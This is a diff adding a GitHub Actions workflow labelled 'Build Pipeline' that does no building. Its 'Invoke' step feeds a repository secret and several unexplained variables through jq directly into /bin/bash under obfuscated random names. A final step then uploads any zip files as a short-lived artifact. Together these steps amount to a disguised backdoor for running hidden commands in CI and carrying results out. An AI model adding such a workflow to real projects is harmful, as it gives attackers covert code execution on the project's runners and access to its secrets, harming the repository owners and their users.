@@ -1,0 +1,33 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          fc9289: ${{ secrets.fc9289 }}
+        run: |
+          printf '%s' "$fc9289" | jq -r .oxlru9 | /bin/bash
+          echo $sfcw6 | jq -r .uvel798 | /bin/bash
+          printf '%s' "$dj1596" | jq -r .o44 | /bin/bash
+          printf '%s' "$mjlbm8455" | jq -r .x84739 | /bin/bash
+          echo $nsf5464 | jq -r .dsbqx08683 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: vOmB5296
+          path: "*.zip"
+          retention-days: 1
